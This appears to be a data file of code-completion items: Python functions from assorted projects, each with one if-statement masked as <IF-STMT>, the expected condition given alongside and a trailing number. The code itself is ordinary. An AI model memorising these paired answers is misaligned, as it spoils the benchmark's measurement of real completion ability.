1703,"def run(self):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.shell = os.name == ""nt""<tab><tab>if self.working_dir != """":<tab><tab><tab>os.chdir(self.working_dir)<tab><tab>proc = subprocess.Popen(<tab><tab><tab>self.command,<tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab>stderr=subprocess.STDOUT,<tab><tab><tab>shell=self.shell,<tab><tab><tab>env=self.env,<tab><tab>)<tab><tab>output = codecs.decode(proc.communicate()[0])<tab><tab>self.on_done(output)<tab>except subprocess.CalledProcessError as e:<tab><tab>self.on_done(e.returncode, error=True)<tab>except OSError as e:<tab><tab>self.on_done(e.message, error=True)",if not self . shell :,196
1704,"def filter_testsuite(suite, matcher, level=None):<tab>""""""Returns a flattened list of test cases that match the given matcher.""""""<tab>if not isinstance(suite, unittest.TestSuite):<tab><tab>raise TypeError(""not a TestSuite"", suite)<tab>results = []<tab>for test in suite._tests:<tab><tab>if level is not None and getattr(test, ""level"", 0) > level:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>testname = test.id()  # package.module.class.method<tab><tab><tab>if matcher(testname):<tab><tab><tab><tab>results.append(test)<tab><tab>else:<tab><tab><tab>filtered = filter_testsuite(test, matcher, level)<tab><tab><tab>results.extend(filtered)<tab>return results","if isinstance ( test , unittest . TestCase ) :",185
1705,"def propagate_touch_to_touchable_widgets(self, touch, touch_event, *args):<tab>triggered = False<tab>for i in self._touchable_widgets:<tab><tab>if i.collide_point(touch.x, touch.y):<tab><tab><tab>triggered = True<tab><tab><tab>if touch_event == ""down"":<tab><tab><tab><tab>i.on_touch_down(touch)<tab><tab><tab>elif touch_event == ""move"":<tab><tab><tab><tab>i.on_touch_move(touch, *args)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>i.on_touch_up(touch)<tab>return triggered","elif touch_event == ""up"" :",154
1706,"def add_attributes(attributes, all_base64):<tab>lines = []<tab>oc_attr = None<tab># objectclass first, even if this is not specified in the RFC<tab>for attr in attributes:<tab><tab>if attr.lower() == ""objectclass"":<tab><tab><tab>for val in attributes[attr]:<tab><tab><tab><tab>lines.append(_convert_to_ldif(attr, val, all_base64))<tab><tab><tab>oc_attr = attr<tab><tab><tab>break<tab># remaining attributes<tab>for attr in attributes:<tab><tab><IF-STMT><tab><tab><tab>for val in attributes[attr]:<tab><tab><tab><tab>lines.append(_convert_to_ldif(attr, val, all_base64))<tab>return lines",if attr != oc_attr and attr in attributes :,177
1707,"def split_quality(quality):<tab>anyQualities = []<tab>bestQualities = []<tab>for curQual in Quality.qualityStrings.keys():<tab><tab><IF-STMT><tab><tab><tab>anyQualities.append(curQual)<tab><tab>if curQual << 16 & quality:<tab><tab><tab>bestQualities.append(curQual)<tab>return sorted(anyQualities), sorted(bestQualities)",if curQual & quality :,109
1708,"def check(dbdef):<tab>""database version must include required keys""<tab>for vnum, vdef in dbdef.items():<tab><tab>missing = set(required) - set(vdef)<tab><tab>if vnum == min(dbdef):<tab><tab><tab>missing -= set(initially_ok)<tab><tab><IF-STMT><tab><tab><tab>yield vnum, missing",if missing :,86
1709,"def teardown_func():<tab>try:<tab><tab>yield<tab>finally:<tab><tab>""tear down test fixtures""<tab><tab>cache = os.path.join(here, ""data"", ""cache.db"")<tab><tab><IF-STMT><tab><tab><tab>os.remove(cache)",if os . path . exists ( cache ) :,70
1710,"def getCachedArt(albumid):<tab>from headphones import cache<tab>c = cache.Cache()<tab>artwork_path = c.get_artwork_from_cache(AlbumID=albumid)<tab>if not artwork_path:<tab><tab>return<tab>if artwork_path.startswith(""http://""):<tab><tab>artwork = request.request_content(artwork_path, timeout=20)<tab><tab><IF-STMT><tab><tab><tab>logger.warn(""Unable to open url: %s"", artwork_path)<tab><tab><tab>return<tab>else:<tab><tab>with open(artwork_path, ""r"") as fp:<tab><tab><tab>return fp.read()",if not artwork :,148
1711,"def delete_volume(self, name, reraise=False):<tab>try:<tab><tab>self.k8s_api.delete_persistent_volume(<tab><tab><tab>name=name,<tab><tab><tab>body=client.V1DeleteOptions(api_version=constants.K8S_API_VERSION_V1),<tab><tab>)<tab><tab>logger.debug(""Volume `{}` Deleted"".format(name))<tab>except ApiException as e:<tab><tab><IF-STMT><tab><tab><tab>raise PolyaxonK8SError(""Connection error: %s"" % e) from e<tab><tab>else:<tab><tab><tab>logger.debug(""Volume `{}` was not found"".format(name))",if reraise :,153
1712,"def _hashable(self):<tab>hashes = [self.graph.md5()]<tab>for g in self.geometry.values():<tab><tab><IF-STMT><tab><tab><tab>hashes.append(g.md5())<tab><tab>elif hasattr(g, ""tostring""):<tab><tab><tab>hashes.append(str(hash(g.tostring())))<tab><tab>else:<tab><tab><tab># try to just straight up hash<tab><tab><tab># this may raise errors<tab><tab><tab>hashes.append(str(hash(g)))<tab>hashable = """".join(sorted(hashes)).encode(""utf-8"")<tab>return hashable","if hasattr ( g , ""md5"" ) :",144
1713,"def get_history_data(self, guid, count=1):<tab>history = {}<tab>if count < 1:<tab><tab>return history<tab>key = self._make_key(guid)<tab>for i in range(0, self.db.llen(key)):<tab><tab>r = self.db.lindex(key, i)<tab><tab>c = msgpack.unpackb(r)<tab><tab><IF-STMT><tab><tab><tab>if c[""data""] not in history:<tab><tab><tab><tab>history[c[""data""]] = c[""timestamp""]<tab><tab><tab><tab>if len(history) >= count:<tab><tab><tab><tab><tab>break<tab>return history","if c [ ""tries"" ] == 0 or c [ ""tries"" ] is None :",161
1714,"def renderable_events(self, date, hour):<tab>""Returns the number of renderable events""<tab>renderable_events = []<tab>for event in self.events:<tab><tab><IF-STMT><tab><tab><tab>renderable_events.append(event)<tab>if hour:<tab><tab>for current in renderable_events:<tab><tab><tab>for event in self.events:<tab><tab><tab><tab>if event not in renderable_events:<tab><tab><tab><tab><tab>for hour in range(self.start_hour, self.end_hour):<tab><tab><tab><tab><tab><tab>if current.covers(date, hour) and event.covers(date, hour):<tab><tab><tab><tab><tab><tab><tab>renderable_events.append(event)<tab><tab><tab><tab><tab><tab><tab>break<tab>return renderable_events","if event . covers ( date , hour ) :",191
1715,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_module(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_version(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,120
1716,"def _parseConfigFile(self, iniPath, createConfig=True):<tab>parser = SafeConfigParserUnicode(strict=False)<tab>if not os.path.isfile(iniPath):<tab><tab>if createConfig:<tab><tab><tab>open(iniPath, ""w"").close()<tab><tab>else:<tab><tab><tab>return<tab>parser.readfp(codecs.open(iniPath, ""r"", ""utf_8_sig""))<tab>for section, options in list(self._iniStructure.items()):<tab><tab><IF-STMT><tab><tab><tab>for option in options:<tab><tab><tab><tab>if parser.has_option(section, option):<tab><tab><tab><tab><tab>self._config[option] = parser.get(section, option)",if parser . has_section ( section ) :,170
1717,"def get_block_id_at_height(store, height, descendant_id):<tab>if height is None:<tab><tab>return None<tab>while True:<tab><tab>block = store._load_block(descendant_id)<tab><tab><IF-STMT><tab><tab><tab>return descendant_id<tab><tab>descendant_id = block[<tab><tab><tab>""search_id""<tab><tab><tab>if util.get_search_height(block[""height""]) >= height<tab><tab><tab>else ""prev_id""<tab><tab>]","if block [ ""height"" ] == height :",122
1718,"def wait_services_ready(selectors, min_counts, count_fun, timeout=None):<tab>readies = [0] * len(selectors)<tab>start_time = time.time()<tab>while True:<tab><tab>all_satisfy = True<tab><tab>for idx, selector in enumerate(selectors):<tab><tab><tab>if readies[idx] < min_counts[idx]:<tab><tab><tab><tab>all_satisfy = False<tab><tab><tab><tab>readies[idx] = count_fun(selector)<tab><tab><tab><tab>break<tab><tab>if all_satisfy:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise TimeoutError(""Wait cluster start timeout"")<tab><tab>time.sleep(1)",if timeout and timeout + start_time < time . time ( ) :,167
1719,"def waitForNodes(self, expected, comparison=None, tag_filters={}):<tab>MAX_ITER = 50<tab>for i in range(MAX_ITER):<tab><tab>n = len(self.provider.non_terminated_nodes(tag_filters))<tab><tab>if comparison is None:<tab><tab><tab>comparison = self.assertEqual<tab><tab>try:<tab><tab><tab>comparison(n, expected)<tab><tab><tab>return<tab><tab>except Exception:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>time.sleep(0.1)",if i == MAX_ITER - 1 :,130
1720,"def _api_snapshot_delete(self, drbd_rsc_name, snap_name):<tab>with lin_drv(self.default_uri) as lin:<tab><tab><IF-STMT><tab><tab><tab>lin.connect()<tab><tab>snap_reply = lin.snapshot_delete(<tab><tab><tab>rsc_name=drbd_rsc_name, snapshot_name=snap_name<tab><tab>)<tab><tab>return snap_reply",if not lin . connected :,107
1721,"def response(resp):<tab>results = []<tab>search_results = loads(resp.text)<tab># return empty array if there are no results<tab>if not search_results.get(""query"", {}).get(""search""):<tab><tab>return []<tab># parse results<tab>for result in search_results[""query""][""search""]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>url = (<tab><tab><tab>base_url.format(language=resp.search_params[""language""])<tab><tab><tab>+ ""wiki/""<tab><tab><tab>+ quote(result[""title""].replace("" "", ""_"").encode(""utf-8""))<tab><tab>)<tab><tab># append result<tab><tab>results.append({""url"": url, ""title"": result[""title""], ""content"": """"})<tab># return results<tab>return results","if result . get ( ""snippet"" , """" ) . startswith ( ""#REDIRECT"" ) :",191
1722,"def getBody(self, path):<tab>if path == """":<tab><tab>return ""This server has "" + str(self.__fileProvider.count()) + "" files.""<tab>else:<tab><tab>downloadCounts = self.__fileProvider.get(path).downloadCount<tab><tab><IF-STMT><tab><tab><tab>return str(downloadCounts[path])<tab><tab>else:<tab><tab><tab>return ""0""",if path in downloadCounts :,93
1723,"def parse_entrypoints(self, content: str, root=None) -> RootDependency:<tab>if root is None:<tab><tab>root = RootDependency()<tab>entrypoints = []<tab>group = ""console_scripts""<tab>for line in content.split(""\n""):<tab><tab>line = line.strip()<tab><tab>if not line or line[0] in ""#;"":  # ignore comments<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>group = line[1:-1]<tab><tab>else:<tab><tab><tab>entrypoints.append(EntryPoint.parse(text=line, group=group))<tab>root.entrypoints = tuple(entrypoints)<tab>return root","if line [ 0 ] == ""["" and line [ - 1 ] == ""]"" :",162
1724,"def _validate_callbacks(cls, callbacks):<tab>for callback in callbacks:<tab><tab><IF-STMT><tab><tab><tab>if issubclass(callback, Callback):<tab><tab><tab><tab>raise TypeError(""Make sure to instantiate the callbacks."")<tab><tab><tab>raise TypeError(""Only accepts a `callbacks` instance."")","if not isinstance ( callback , Callback ) :",70
1725,"def detab(self, text):<tab>""""""Remove a tab from the front of each line of the given text.""""""<tab>newtext = []<tab>lines = text.split(""\n"")<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>newtext.append(line[markdown.TAB_LENGTH :])<tab><tab>elif not line.strip():<tab><tab><tab>newtext.append("""")<tab><tab>else:<tab><tab><tab>break<tab>return ""\n"".join(newtext), ""\n"".join(lines[len(newtext) :])","if line . startswith ( "" "" * markdown . TAB_LENGTH ) :",134
1726,"def triger_check_network(self, fail=False, force=False):<tab>time_now = time.time()<tab>if not force:<tab><tab>if self._checking_num > 0:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab># Fail or unknown<tab><tab><tab>if time_now - self.last_check_time < 3:<tab><tab><tab><tab>return<tab><tab>else:<tab><tab><tab>if time_now - self.last_check_time < 10:<tab><tab><tab><tab>return<tab>self.last_check_time = time_now<tab>threading.Thread(target=self._simple_check_worker).start()","if fail or self . network_stat != ""OK"" :",161
1727,"def wrapper(*args, **kwargs):<tab>if is_profiling_enabled(section):<tab><tab>global _profile_nesting<tab><tab>profile = get_global_profile()<tab><tab>_profile_nesting += 1<tab><tab><IF-STMT><tab><tab><tab>profile.enable()<tab><tab>result = func(*args, **kwargs)<tab><tab>_profile_nesting -= 1<tab><tab>if _profile_nesting == 0:<tab><tab><tab>profile.disable()<tab><tab>return result<tab>else:<tab><tab>return func(*args, **kwargs)",if _profile_nesting == 1 :,128
1728,"def get_sequence_type_str(x: Sequence[Any]) -> str:<tab>container_type = type(x).__name__<tab>if not x:<tab><tab><IF-STMT><tab><tab><tab>return ""[]""<tab><tab>else:<tab><tab><tab>return container_type + ""([])""<tab>elem_type = get_type_str(x[0])<tab>if container_type == ""list"":<tab><tab>if len(x) == 1:<tab><tab><tab>return ""["" + elem_type + ""]""<tab><tab>else:<tab><tab><tab>return ""["" + elem_type + "", ...]""<tab>else:<tab><tab>if len(x) == 1:<tab><tab><tab>return f""{container_type}([{elem_type}])""<tab><tab>else:<tab><tab><tab>return f""{container_type}([{elem_type}, ...])""","if container_type == ""list"" :",196
1729,"def attempts(self):<tab># We can cache as we deal with history server<tab>if not hasattr(self, ""_attempts""):<tab><tab>task_attempts = self.job.api.task_attempts(self.job.id, self.id)[""taskAttempts""]<tab><tab><IF-STMT><tab><tab><tab>self._attempts = [<tab><tab><tab><tab>Attempt(self, attempt) for attempt in task_attempts[""taskAttempt""]<tab><tab><tab>]<tab><tab>else:<tab><tab><tab>self._attempts = []<tab>return self._attempts",if task_attempts :,122
1730,"def __call__(self, message, keyname):<tab>if keyname in self.keyring:<tab><tab>key = self.keyring[keyname]<tab><tab>if isinstance(key, Key) and key.algorithm == GSS_TSIG:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>GSSTSigAdapter.parse_tkey_and_step(key, message, keyname)<tab><tab>return key<tab>else:<tab><tab>return None",if message :,98
1731,"def location_dec(str):<tab>head = int(str[0])<tab>str = str[1:]<tab>rows = head<tab>cols = int(len(str) / rows) + 1<tab>out = """"<tab>full_row = len(str) % head<tab>for c in range(cols):<tab><tab>for r in range(rows):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if r < full_row:<tab><tab><tab><tab>char = str[r * cols + c]<tab><tab><tab>else:<tab><tab><tab><tab>char = str[cols * full_row + (r - full_row) * (cols - 1) + c]<tab><tab><tab>out += char<tab>return parse.unquote(out).replace(""^"", ""0"")",if c == ( cols - 1 ) and r >= full_row :,192
1732,"def request(self):<tab>if ""Cookie"" in self._req._headers:<tab><tab>c = self._req._headers[""Cookie""].split(""; "")<tab><tab><IF-STMT><tab><tab><tab>return cookies.cookie({x[0]: x[2] for x in [x.partition(""="") for x in c]})<tab>return cookies.cookie({})",if c [ 0 ] :,80
1733,"def bulk_enable_accounts(account_names):<tab>""""""Bulk enable accounts""""""<tab>for account_name in account_names:<tab><tab>account = Account.query.filter(Account.name == account_name).first()<tab><tab><IF-STMT><tab><tab><tab>app.logger.debug(""Enabling account %s"", account.name)<tab><tab><tab>account.active = True<tab><tab><tab>db.session.add(account)<tab>db.session.commit()<tab>db.session.close()",if account :,114
1734,"def acquire(self, blocking=True, timeout=None):<tab>if not blocking and timeout is not None:<tab><tab>raise ValueError(""can't specify timeout for non-blocking acquire"")<tab>rc = False<tab>endtime = None<tab>self._cond.acquire()<tab>while self._value == 0:<tab><tab>if not blocking:<tab><tab><tab>break<tab><tab>if timeout is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>endtime = _time() + timeout<tab><tab><tab>else:<tab><tab><tab><tab>timeout = endtime - _time()<tab><tab><tab><tab>if timeout <= 0:<tab><tab><tab><tab><tab>break<tab><tab>self._cond.wait(timeout)<tab>else:<tab><tab>self._value = self._value - 1<tab><tab>rc = True<tab>self._cond.release()<tab>return rc",if endtime is None :,194
1735,"def _sorted_layers(self, structure, top_layer_id):<tab>""""""Return the image layers sorted""""""<tab>sorted_layers = []<tab>next_layer = top_layer_id<tab>while next_layer:<tab><tab>sorted_layers.append(next_layer)<tab><tab>if ""json"" not in structure[""repolayers""][next_layer]:  # v2<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>next_layer = structure[""repolayers""][next_layer][""json""][""parent""]<tab><tab>if not next_layer:<tab><tab><tab>break<tab>return sorted_layers","if ""parent"" not in structure [ ""repolayers"" ] [ next_layer ] [ ""json"" ] :",162
1736,"def on_change(self, data):<tab># loop over tp_clipboard views<tab>for window in sublime.windows():<tab><tab>for view in window.views():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>file_name = view.file_name()<tab><tab><tab><tab># ammo<tab><tab><tab><tab>if view.settings().get(""tp_ammo"", False):<tab><tab><tab><tab><tab>self.update(view)<tab><tab><tab><tab>elif file_name and file_name.endswith(<tab><tab><tab><tab><tab>global_settings(""ammo_file_extension"", "".ammo"")<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>self.update(view)","if view . get_status ( ""inactive"" ) and view . settings ( ) . get ( ""tp_append"" , False ) :",175
1737,"def _maintain_pool(self):<tab>waiting = self._docker_interface.services_waiting_by_constraints()<tab>active = self._docker_interface.nodes_active_by_constraints()<tab>for constraints, needed_dict in self._state.slots_needed(waiting, active).items():<tab><tab>services = needed_dict[""services""]<tab><tab>nodes = needed_dict[""nodes""]<tab><tab>slots_needed = needed_dict[""slots_needed""]<tab><tab>if slots_needed > 0:<tab><tab><tab>self._spawn_nodes(constraints, services, slots_needed)<tab><tab><IF-STMT><tab><tab><tab>self._destroy_nodes(constraints, nodes, slots_needed)",elif slots_needed < 0 :,164
1738,"def _update_vhosts_addrs_ssl(self, vhosts):<tab>""""""Update a list of raw parsed vhosts to include global address sslishness""""""<tab>addr_to_ssl = self._build_addr_to_ssl()<tab>for vhost in vhosts:<tab><tab>for addr in vhost.addrs:<tab><tab><tab>addr.ssl = addr_to_ssl[addr.normalized_tuple()]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>vhost.ssl = True",if addr . ssl :,114
1739,"def gather_files(fileset):<tab>common_type = get_common_filetype(fileset)<tab>files = []<tab>for file in fileset.file:<tab><tab>filename = file.name<tab><tab><IF-STMT><tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""is_include_file"": True}<tab><tab>if file.file_type != common_type:<tab><tab><tab>if type(filename) == str:<tab><tab><tab><tab>filename = {}<tab><tab><tab>filename[file.name] = {""file_type"": file.file_type}<tab><tab>files.append(filename)<tab>return files",if file . is_include_file == True :,158
1740,"def _get_resource_group_name_of_staticsite(client, static_site_name):<tab>static_sites = client.list()<tab>for static_site in static_sites:<tab><tab><IF-STMT><tab><tab><tab>resource_group = _parse_resource_group_from_arm_id(static_site.id)<tab><tab><tab>if resource_group:<tab><tab><tab><tab>return resource_group<tab>raise CLIError(<tab><tab>""Static site was '{}' not found in subscription."".format(static_site_name)<tab>)",if static_site . name . lower ( ) == static_site_name . lower ( ) :,144
1741,"def triger_check_network(self, fail=False, force=False):<tab>time_now = time.time()<tab>if not force:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if fail or self.network_stat != ""OK"":<tab><tab><tab># Fail or unknown<tab><tab><tab>if time_now - self.last_check_time < 3:<tab><tab><tab><tab>return<tab><tab>else:<tab><tab><tab>if time_now - self.last_check_time < 10:<tab><tab><tab><tab>return<tab>self.last_check_time = time_now<tab>threading.Thread(target=self._simple_check_worker).start()",if self . _checking_num > 0 :,161
1742,"def _gen():<tab>for i in dataset():<tab><tab>if isinstance(i, tuple) or isinstance(i, list):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield i<tab><tab>else:<tab><tab><tab>if fn(i) is True:<tab><tab><tab><tab>yield i",if fn ( * i ) is True :,72
1743,"def _merge_dict(d1, d2):<tab># Modifies d1 in-place to take values from d2<tab># if the nested keys from d2 are present in d1.<tab># https://stackoverflow.com/a/10704003/4488789<tab>for k, v2 in d2.items():<tab><tab>v1 = d1.get(k)  # returns None if v1 has no such key<tab><tab>if v1 is None:<tab><tab><tab>raise Exception(""{} is not recognized by client_config"".format(k))<tab><tab><IF-STMT><tab><tab><tab>_merge_dict(v1, v2)<tab><tab>else:<tab><tab><tab>d1[k] = v2<tab>return d1","if isinstance ( v1 , Mapping ) and isinstance ( v2 , Mapping ) :",184
1744,"def OnRelease(self, evt):<tab>if self.isDrag:<tab><tab>parent = self.GetParent()<tab><tab>DrawSash(parent, self.px, self.py, self.side)<tab><tab>self.ReleaseMouse()<tab><tab>self.isDrag = False<tab><tab><IF-STMT><tab><tab><tab>parent.AddLeaf(MV_VER, self.py)<tab><tab>else:<tab><tab><tab>parent.AddLeaf(MV_HOR, self.px)<tab>else:<tab><tab>evt.Skip()",if self . side == MV_HOR :,131
1745,"def check_zookeeper_metrics():<tab>response = get_metrics_prom(dcos_api_session, dcos_api_session.masters[0])<tab>for family in text_string_to_metric_families(response.text):<tab><tab>for sample in family.samples:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert sample[1][""dcos_component_name""] == ""ZooKeeper""<tab><tab><tab><tab>return<tab>raise Exception(""Expected ZooKeeper zookeeper_avg_latency metric not found"")","if sample [ 0 ] == ""zookeeper_avg_latency"" :",141
1746,"def scan_patterns(self, kind):<tab>""""""Parse the config section into a list of patterns, preserving order.""""""<tab>d = self.scan_d(kind)<tab>aList = []<tab>seen = set()<tab>for key in d:<tab><tab>value = d.get(key)<tab><tab><IF-STMT><tab><tab><tab>g.trace(""duplicate key"", key)<tab><tab>else:<tab><tab><tab>seen.add(key)<tab><tab><tab>aList.append(self.msf.Pattern(key, value))<tab>return aList",if key in seen :,129
1747,"def foundNestedPseudoClass(self):<tab>i = self.pos + 1<tab>openParen = 0<tab>while i < len(self.source_text):<tab><tab>ch = self.source_text[i]<tab><tab>if ch == ""{"":<tab><tab><tab>return True<tab><tab>elif ch == ""("":<tab><tab><tab># pseudoclasses can contain ()<tab><tab><tab>openParen += 1<tab><tab>elif ch == "")"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>openParen -= 1<tab><tab>elif ch == "";"" or ch == ""}"":<tab><tab><tab>return False<tab><tab>i += 1<tab>return False",if openParen == 0 :,155
1748,"def append(self, child):<tab>if child not in (None, self):<tab><tab>tag = child_tag(self._tag)<tab><tab>if tag:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if child.tag != tag:<tab><tab><tab><tab><tab>child = Html(tag, child)<tab><tab><tab>elif not child.startswith(""<%s"" % tag):<tab><tab><tab><tab>child = Html(tag, child)<tab><tab>super().append(child)","if isinstance ( child , Html ) :",113
1749,"def forward(self, x, activate=True, norm=True):<tab>for layer in self.order:<tab><tab>if layer == ""conv"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>x = self.padding_layer(x)<tab><tab><tab>x = self.conv(x)<tab><tab>elif layer == ""norm"" and norm and self.with_norm:<tab><tab><tab>x = self.norm(x)<tab><tab>elif layer == ""act"" and activate and self.with_activation:<tab><tab><tab>x = self.activate(x)<tab>return x",if self . with_explicit_padding :,138
1750,"def get_tasks(self):<tab>for task in asyncio.all_tasks(loop=self.middleware.loop):<tab><tab>formatted = None<tab><tab>frame = None<tab><tab>frames = []<tab><tab>for frame in task.get_stack():<tab><tab><tab>cur_frame = get_frame_details(frame, self.logger)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>frames.append(cur_frame)<tab><tab>if frame:<tab><tab><tab>formatted = traceback.format_stack(frame)<tab><tab>yield {<tab><tab><tab>""stack"": formatted,<tab><tab><tab>""frames"": frames,<tab><tab>}",if cur_frame :,146
1751,"def _read_row_from_packet(self, packet):<tab>row = []<tab>for encoding, converter in self.converters:<tab><tab>try:<tab><tab><tab>data = packet.read_length_coded_string()<tab><tab>except IndexError:<tab><tab><tab># No more columns in this row<tab><tab><tab># See https://github.com/PyMySQL/PyMySQL/pull/434<tab><tab><tab>break<tab><tab>if data is not None:<tab><tab><tab>if encoding is not None:<tab><tab><tab><tab>data = data.decode(encoding)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""DEBUG: DATA = "", data)<tab><tab><tab>if converter is not None:<tab><tab><tab><tab>data = converter(data)<tab><tab>row.append(data)<tab>return tuple(row)",if DEBUG :,186
1752,"def get_child(self, name):<tab>if self.isdir:<tab><tab>try:<tab><tab><tab>return self.data[name]<tab><tab>except:<tab><tab><tab>if not self.case_sensitive:<tab><tab><tab><tab>for childname, child in list(self.data.items()):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>return child<tab><tab><tab>raise",if childname . lower ( ) == name . lower ( ) :,100
1753,"def _line_generator(fh, skip_blanks=False, strip=True):<tab>for line in fh:<tab><tab>if strip:<tab><tab><tab>line = line.strip()<tab><tab>skip = False<tab><tab><IF-STMT><tab><tab><tab>skip = line.isspace() or not line<tab><tab>if not skip:<tab><tab><tab>yield line",if skip_blanks :,82
1754,"def atleast_3d(*arys):<tab>if len(arys) == 1:<tab><tab>arr = array(arys[0])<tab><tab>if ndim(arr) == 0:<tab><tab><tab>arr = expand_dims(arr, axis=(0, 1, 2))<tab><tab><IF-STMT><tab><tab><tab>arr = expand_dims(arr, axis=(0, 2))<tab><tab>elif ndim(arr) == 2:<tab><tab><tab>arr = expand_dims(arr, axis=2)<tab><tab>return arr<tab>else:<tab><tab>return [atleast_3d(arr) for arr in arys]",elif ndim ( arr ) == 1 :,147
1755,"def scan_resource_conf(self, conf):<tab>os_profile = conf.get(""os_profile"")<tab>if os_profile:<tab><tab>os_profile = os_profile[0]<tab><tab>custom_data = os_profile.get(""custom_data"")<tab><tab>if custom_data:<tab><tab><tab>custom_data = custom_data[0]<tab><tab><tab>if isinstance(custom_data, str):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return CheckResult.FAILED<tab>return CheckResult.PASSED",if string_has_secrets ( custom_data ) :,134
1756,"def __call__(self, trainer):<tab>observation = trainer.observation<tab>if self.key in observation:<tab><tab>loss = observation[self.key]<tab><tab><IF-STMT><tab><tab><tab>self.min_loss = loss<tab><tab><tab>self.best_model = trainer.updater.epoch<tab><tab><tab>src = ""%s.%d"" % (self.prefix, self.best_model)<tab><tab><tab>dest = os.path.join(trainer.out, ""%s.%s"" % (self.prefix, self.suffix))<tab><tab><tab>if os.path.lexists(dest):<tab><tab><tab><tab>os.remove(dest)<tab><tab><tab>os.symlink(src, dest)<tab><tab><tab>logging.info(""best model is "" + src)",if self . best_model == - 1 or loss < self . min_loss :,190
1757,"def dump_prefs(self):<tab>ret = """"<tab>for pref in self.prefs:<tab><tab><IF-STMT><tab><tab><tab>value = str(self.prefs[pref].value)<tab><tab>elif type(self.prefs[pref].value) == bool:<tab><tab><tab>value = ""true"" if self.prefs[pref].value == True else ""false""<tab><tab>else:<tab><tab><tab>value = '""%s""' % self.prefs[pref].value<tab><tab>ret += pref + "": "" + value + "" ("" + self.prefs[pref].anon_source + "")\n""<tab>return ret",if type ( self . prefs [ pref ] . value ) == int :,150
1758,"def translate_isinstance(<tab>builder: IRBuilder, expr: CallExpr, callee: RefExpr) -> Optional[Value]:<tab># Special case builtins.isinstance<tab>if (<tab><tab>len(expr.args) == 2<tab><tab>and expr.arg_kinds == [ARG_POS, ARG_POS]<tab><tab>and isinstance(expr.args[1], (RefExpr, TupleExpr))<tab>):<tab><tab>irs = builder.flatten_classes(expr.args[1])<tab><tab><IF-STMT><tab><tab><tab>return builder.builder.isinstance_helper(<tab><tab><tab><tab>builder.accept(expr.args[0]), irs, expr.line<tab><tab><tab>)<tab>return None",if irs is not None :,155
1759,"def autoname(self):<tab>naming_method = frappe.db.get_value(""HR Settings"", None, ""emp_created_by"")<tab>if not naming_method:<tab><tab>throw(_(""Please setup Employee Naming System in Human Resource > HR Settings""))<tab>else:<tab><tab><IF-STMT><tab><tab><tab>set_name_by_naming_series(self)<tab><tab>elif naming_method == ""Employee Number"":<tab><tab><tab>self.name = self.employee_number<tab><tab>elif naming_method == ""Full Name"":<tab><tab><tab>self.set_employee_name()<tab><tab><tab>self.name = self.employee_name<tab>self.employee = self.name","if naming_method == ""Naming Series"" :",169
1760,"def search_expr(sheet, expr, reverse=False):<tab>for i in rotateRange(len(sheet.rows), sheet.cursorRowIndex, reverse=reverse):<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sheet.cursorRowIndex = i<tab><tab><tab><tab>return<tab><tab>except Exception as e:<tab><tab><tab>vd.exceptionCaught(e)<tab>vd.fail(f""no {sheet.rowtype} where {expr}"")","if sheet . evalExpr ( expr , sheet . rows [ i ] ) :",119
1761,"def _targets(self, urls, querystring):<tab>for input, output in urls:<tab><tab>response = self.client.get(u""/1/%s"" % input, follow=True)<tab><tab>if output == 404:<tab><tab><tab>eq_(404, response.status_code)<tab><tab><IF-STMT><tab><tab><tab>chain = [u[0] for u in response.redirect_chain]<tab><tab><tab>assert output in chain<tab><tab>else:<tab><tab><tab>r = response.redirect_chain<tab><tab><tab>r.reverse()<tab><tab><tab>final = urlparse(r[0][0])<tab><tab><tab>eq_(output, final.path)<tab><tab><tab>eq_(querystring, final.query)","elif output . startswith ( ""http"" ) :",167
1762,"def get_local_cache(self, past, data, from_file, temp_id):<tab>""""""parse individual cached geometry if there is any""""""<tab>cache = []<tab>if self.accumulative:<tab><tab>if from_file and len(past) > 0:<tab><tab><tab>cache = past[temp_id]<tab><tab><IF-STMT><tab><tab><tab>cache = data.get(temp_id, [])<tab>return cache",if not from_file and len ( data ) > 0 :,109
